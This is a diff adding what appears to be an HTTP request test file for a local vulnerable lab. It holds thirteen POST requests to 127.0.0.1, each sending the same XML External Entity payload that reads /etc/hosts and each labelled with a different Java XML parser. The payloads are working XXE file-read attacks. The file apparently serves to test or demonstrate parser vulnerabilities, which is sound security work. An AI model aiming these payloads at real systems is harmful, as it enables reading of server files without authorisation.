@@ -1,0 +1,117 @@
+###
+# case1 xmlReader
+POST /xxe/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case2 jdomSAXBuilder
+POST /xxe/case2 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case3 jdom2SAXBuilder
+POST /xxe/case3 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case4 javaxSAXParser
+POST /xxe/case4 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case5 dom4jSAXReader
+POST /xxe/case5 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case6 jaxpSAXParserFactoryImpl
+POST /xxe/case6 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case7 xercesSAXParser
+POST /xxe/case7 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case8 javaxDocumentBuilder
+POST /xxe/case8 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case9 jaxpDocumentBuilderImpl
+POST /xxe/case9 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case10 jaxpDocumentBuilderFactoryImpl
+POST /xxe/case10 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case11 jaxpXercesDocumentBuilderFactoryImpl
+POST /xxe/case11 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case12 dom4jDocumentHelper
+POST /xxe/case12 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
+###
+# case13 javaxXMLInputFactory
+POST /xxe/case13 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+
